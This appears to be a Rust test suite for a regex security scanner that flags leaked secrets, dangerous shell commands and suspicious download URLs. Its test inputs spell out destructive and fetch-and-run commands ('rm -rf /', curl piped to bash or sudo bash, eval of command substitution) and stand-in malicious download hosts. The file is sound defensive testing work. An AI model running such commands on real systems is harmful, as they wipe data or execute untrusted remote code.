//! Per-rule tests for `RegexScanner`. Every ADR-0005 rule that has
//! an MVP implementation (1-9) gets at least one positive and one
//! negative test. Rules 10-13 are stubbed in MVP and are tested only
//! at the rule-table level (presence, default severity).

use std::fs;

use super::*;

// -----------------------------------------------------------------------
// Helpers
// -----------------------------------------------------------------------

fn policy_with_trusted(domains: &[&str]) -> ScanPolicy {
    let mut p = ScanPolicy::mvp_default();
    for d in domains {
        p.trusted_domains.push((*d).to_string());
    }
    p
}

fn scan_str(text: &str, policy: &ScanPolicy) -> Vec<Finding> {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("input.md");
    fs::write(&path, text).unwrap();
    RegexScanner.scan(dir.path(), policy).unwrap()
}

fn has_rule(findings: &[Finding], rule: &str) -> bool {
    findings.iter().any(|f| f.rule == rule)
}

fn count_rule(findings: &[Finding], rule: &str) -> usize {
    findings.iter().filter(|f| f.rule == rule).count()
}

// -----------------------------------------------------------------------
// Rule table (ADR-0005 has 13 rules)
// -----------------------------------------------------------------------

#[test]
fn rule_table_has_13_rules_per_adr_0005() {
    assert_eq!(RULES.len(), 13);
    let ids: Vec<&str> = RULES.iter().map(|r| r.id).collect();
    for expected in [
        "secret.aws-access-key",
        "secret.github-token",
        "secret.generic-password",
        "secret.private-key",
        "shell.dangerous-rm-rf",
        "shell.dangerous-curl-pipe-bash",
        "shell.dangerous-eval-exec",
        "url.suspicious-download-endpoint",
        "url.allowed-domain",
        "exec.executable-in-data",
        "archive.symlink-traversal",
        "archive.zip-slip",
        "manifest.foreign-executable",
    ] {
        assert!(ids.contains(&expected), "missing rule `{expected}`");
    }
}

// -----------------------------------------------------------------------
// Rule 1: AWS access key
// -----------------------------------------------------------------------

#[test]
fn rule1_aws_access_key_block() {
    let findings = scan_str(
        "AKIAIOSFODNN7EXAMPLE is the key",
        &ScanPolicy::mvp_default(),
    );
    let f = findings
        .iter()
        .find(|f| f.rule == "secret.aws-access-key")
        .expect("expected AWS key finding");
    assert_eq!(f.severity, Severity::Block);
}

#[test]
fn rule1_aws_access_key_clean_text_no_finding() {
    let findings = scan_str(
        "this is just a regular paragraph about AWS services",
        &ScanPolicy::mvp_default(),
    );
    assert_eq!(count_rule(&findings, "secret.aws-access-key"), 0);
}

// -----------------------------------------------------------------------
// Rule 2: GitHub token
// -----------------------------------------------------------------------

#[test]
fn rule2_github_token_block() {
    let findings = scan_str(
        "GITHUB_TOKEN=ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        &ScanPolicy::mvp_default(),
    );
    let f = findings
        .iter()
        .find(|f| f.rule == "secret.github-token")
        .expect("expected gh token finding");
    assert_eq!(f.severity, Severity::Block);
}

#[test]
fn rule2_github_personal_token_block() {
    let findings = scan_str(
        "export GH_TOKEN=gho_abcdefghijklmnopqrstuvwxyz0123456789",
        &ScanPolicy::mvp_default(),
    );
    assert!(has_rule(&findings, "secret.github-token"));
}

// -----------------------------------------------------------------------
// Rule 3: generic password (WARN)
// -----------------------------------------------------------------------

#[test]
fn rule3_generic_password_warn() {
    let findings = scan_str(
        r#"database = { password: "hunter2hunter2" }"#,
        &ScanPolicy::mvp_default(),
    );
    let f = findings
        .iter()
        .find(|f| f.rule == "secret.generic-password")
        .expect("expected password finding");
    assert_eq!(f.severity, Severity::Warn);
}

#[test]
fn rule3_short_password_not_flagged() {
    // The heuristic requires at least 8 chars to keep the noise down.
    let findings = scan_str(r#"password: "x""#, &ScanPolicy::mvp_default());
    assert_eq!(count_rule(&findings, "secret.generic-password"), 0);
}

// -----------------------------------------------------------------------
// Rule 4: private key
// -----------------------------------------------------------------------

#[test]
fn rule4_private_key_block() {
    let findings = scan_str(
        "-----BEGIN RSA PRIVATE KEY-----\n...\n-----END RSA PRIVATE KEY-----",
        &ScanPolicy::mvp_default(),
    );
    let f = findings
        .iter()
        .find(|f| f.rule == "secret.private-key")
        .expect("expected private key finding");
    assert_eq!(f.severity, Severity::Block);
}

#[test]
fn rule4_openssh_private_key_block() {
    let findings = scan_str(
        "-----BEGIN OPENSSH PRIVATE KEY-----\n...",
        &ScanPolicy::mvp_default(),
    );
    assert!(has_rule(&findings, "secret.private-key"));
}

// -----------------------------------------------------------------------
// Rule 5: rm -rf / (and only when followed by whitespace or EOL)
// -----------------------------------------------------------------------

#[test]
fn rule5_rm_rf_root_block() {
    let findings = scan_str("rm -rf /", &ScanPolicy::mvp_default());
    let f = findings
        .iter()
        .find(|f| f.rule == "shell.dangerous-rm-rf")
        .expect("expected rm -rf finding");
    assert_eq!(f.severity, Severity::Block);
}

#[test]
fn rule5_rm_rf_relative_not_flagged() {
    // `rm -rf ./build` is normal; the rule only fires on `/` to limit
    // false positives.
    let findings = scan_str("rm -rf ./build", &ScanPolicy::mvp_default());
    assert_eq!(count_rule(&findings, "shell.dangerous-rm-rf"), 0);
}

// -----------------------------------------------------------------------
// Rule 6: curl | bash
// -----------------------------------------------------------------------

#[test]
fn rule6_curl_pipe_bash_block() {
    let findings = scan_str(
        "curl -sSL https://example.com/install.sh | bash",
        &ScanPolicy::mvp_default(),
    );
    let f = findings
        .iter()
        .find(|f| f.rule == "shell.dangerous-curl-pipe-bash")
        .expect("expected curl|bash finding");
    assert_eq!(f.severity, Severity::Block);
}

#[test]
fn rule6_curl_pipe_sudo_bash_block() {
    let findings = scan_str(
        "curl https://x.example | sudo bash",
        &ScanPolicy::mvp_default(),
    );
    assert!(has_rule(&findings, "shell.dangerous-curl-pipe-bash"));
}

// -----------------------------------------------------------------------
// Rule 7: eval/exec of command substitution
// -----------------------------------------------------------------------

#[test]
fn rule7_eval_dollar_paren_block() {
    let findings = scan_str(r#"eval("$(whoami)")"#, &ScanPolicy::mvp_default());
    let f = findings
        .iter()
        .find(|f| f.rule == "shell.dangerous-eval-exec")
        .expect("expected eval finding");
    assert_eq!(f.severity, Severity::Block);
}

#[test]
fn rule7_os_system_dollar_paren_block() {
    let findings = scan_str(r#"os.system("$(id)")"#, &ScanPolicy::mvp_default());
    assert!(has_rule(&findings, "shell.dangerous-eval-exec"));
}

// -----------------------------------------------------------------------
// Rules 8/9: URL trusted vs suspicious
// -----------------------------------------------------------------------

#[test]
fn rule8_untrusted_url_with_executable_extension_block() {
    let findings = scan_str(
        "Download from https://malicious.example.com/payload.exe today.",
        &ScanPolicy::mvp_default(),
    );
    let f = findings
        .iter()
        .find(|f| f.rule == "url.suspicious-download-endpoint")
        .expect("expected suspicious URL finding");
    assert_eq!(f.severity, Severity::Block);
}

#[test]
fn rule8_trusted_url_with_executable_no_finding() {
    let findings = scan_str(
        "Download from https://github.com/foo/bar.exe",
        &policy_with_trusted(&["github.com"]),
    );
    // github.com is trusted; url.allowed-domain PASS-silences
    // url.suspicious-download-endpoint.
    assert_eq!(count_rule(&findings, "url.suspicious-download-endpoint"), 0);
}

#[test]
fn rule8_untrusted_url_no_executable_no_finding() {
    // Plain README link; the dangerous-extension check fails so the
    // rule does not fire.
    let findings = scan_str(
        "See https://untrusted.example.org/page for more.",
        &ScanPolicy::mvp_default(),
    );
    assert_eq!(count_rule(&findings, "url.suspicious-download-endpoint"), 0);
}

#[test]
fn rule9_trusted_domain_wildcard() {
    let findings = scan_str(
        "https://raw.githubusercontent.com/foo/bar/install.sh",
        &policy_with_trusted(&["*.githubusercontent.com"]),
    );
    assert_eq!(count_rule(&findings, "url.suspicious-download-endpoint"), 0);
}

#[test]
fn rule8_wildcard_does_not_match_unrelated() {
    let findings = scan_str(
        "https://raw.evil.com/install.sh",
        &policy_with_trusted(&["*.githubusercontent.com"]),
    );
    assert!(has_rule(&findings, "url.suspicious-download-endpoint"));
}

// -----------------------------------------------------------------------
// Policy overrides
// -----------------------------------------------------------------------

#[test]
fn policy_override_downgrades_block_to_pass_skips_rule() {
    let mut p = ScanPolicy::mvp_default();
    p.rule_overrides
        .insert("secret.aws-access-key".to_string(), Severity::Pass);
    let findings = scan_str("AKIAIOSFODNN7EXAMPLE is the key", &p);
    assert_eq!(count_rule(&findings, "secret.aws-access-key"), 0);
}

#[test]
fn policy_override_upgrades_warn_to_block() {
    let mut p = ScanPolicy::mvp_default();
    p.rule_overrides
        .insert("secret.generic-password".to_string(), Severity::Block);
    let findings = scan_str(r#"password: "hunter2hunter2""#, &p);
    let f = findings
        .iter()
        .find(|f| f.rule == "secret.generic-password")
        .expect("expected password finding");
    assert_eq!(f.severity, Severity::Block);
}

#[test]
fn policy_treat_warn_as_block_applies_to_all_warns() {
    let mut p = ScanPolicy::mvp_default();
    p.treat_warn_as_block = true;
    let findings = scan_str(r#"password: "hunter2hunter2""#, &p);
    let f = findings
        .iter()
        .find(|f| f.rule == "secret.generic-password")
        .expect("expected password finding");
    assert_eq!(f.severity, Severity::Block);
}

// -----------------------------------------------------------------------
// Output shape
// -----------------------------------------------------------------------

#[test]
fn findings_are_sorted_block_first() {
    let findings = scan_str(
        "AKIAIOSFODNN7EXAMPLE\npassword: \"hunter2hunter2\"\n",
        &ScanPolicy::mvp_default(),
    );
    // The BLOCK should come before the WARN in the sorted output.
    let first_block = findings
        .iter()
        .position(|f| f.severity == Severity::Block)
        .unwrap();
    let first_warn = findings
        .iter()
        .position(|f| f.severity == Severity::Warn)
        .unwrap();
    assert!(first_block < first_warn);
}

#[test]
fn empty_input_yields_no_findings() {
    let findings = scan_str("", &ScanPolicy::mvp_default());
    assert!(findings.is_empty());
}

#[test]
fn findings_carry_relative_path() {
    // Two-file catalog: clean.md and bad.md. The bad one has a key.
    let dir = tempfile::tempdir().unwrap();
    fs::write(dir.path().join("clean.md"), "harmless text").unwrap();
    fs::write(dir.path().join("bad.md"), "AKIAIOSFODNN7EXAMPLE").unwrap();
    let findings = RegexScanner
        .scan(dir.path(), &ScanPolicy::mvp_default())
        .unwrap();
    let aws: Vec<&Finding> = findings
        .iter()
        .filter(|f| f.rule == "secret.aws-access-key")
        .collect();
    assert_eq!(aws.len(), 1);
    assert!(aws[0].path.ends_with("bad.md"));
}

#[test]
fn binary_file_is_skipped() {
    let dir = tempfile::tempdir().unwrap();
    let p = dir.path().join("evil.exe");
    fs::write(&p, b"MZ\x90\x00\x03").unwrap();
    // .exe extension puts this in the binary-skip list; the rule
    // engine never reads the file's contents.
    let findings = RegexScanner
        .scan(dir.path(), &ScanPolicy::mvp_default())
        .unwrap();
    assert!(findings.is_empty());
}

#[test]
fn executable_in_data_dir_block() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir(dir.path().join("data")).unwrap();
    let p = dir.path().join("data").join("tool.sh");
    fs::write(&p, "#!/bin/sh\necho hi\n").unwrap();
    let findings = RegexScanner
        .scan(dir.path(), &ScanPolicy::mvp_default())
        .unwrap();
    let f = findings
        .iter()
        .find(|f| f.rule == "exec.executable-in-data")
        .expect("expected exec-in-data finding");
    assert_eq!(f.severity, Severity::Block);
    assert!(f.path.contains("data/tool.sh"));
}

#[test]
fn large_file_is_skipped() {
    let dir = tempfile::tempdir().unwrap();
    let p = dir.path().join("big.md");
    // 3 MiB
    let big = vec![b'a'; 3 * 1024 * 1024];
    fs::write(&p, &big).unwrap();
    let findings = RegexScanner
        .scan(dir.path(), &ScanPolicy::mvp_default())
        .unwrap();
    assert!(findings.is_empty(), "3 MiB file should be skipped");
}

#[test]
fn severity_parse_round_trip() {
    assert_eq!(Severity::parse("PASS").unwrap(), Severity::Pass);
    assert_eq!(Severity::parse("WARN").unwrap(), Severity::Warn);
    assert_eq!(Severity::parse("BLOCK").unwrap(), Severity::Block);
    assert!(Severity::parse("nope").is_err());
    assert_eq!(Severity::Block.as_str(), "BLOCK");
}

#[test]
fn trusted_domain_match_is_case_insensitive() {
    let findings = scan_str(
        "https://GitHub.com/foo/bar.exe",
        &policy_with_trusted(&["github.com"]),
    );
    assert_eq!(count_rule(&findings, "url.suspicious-download-endpoint"), 0);
}
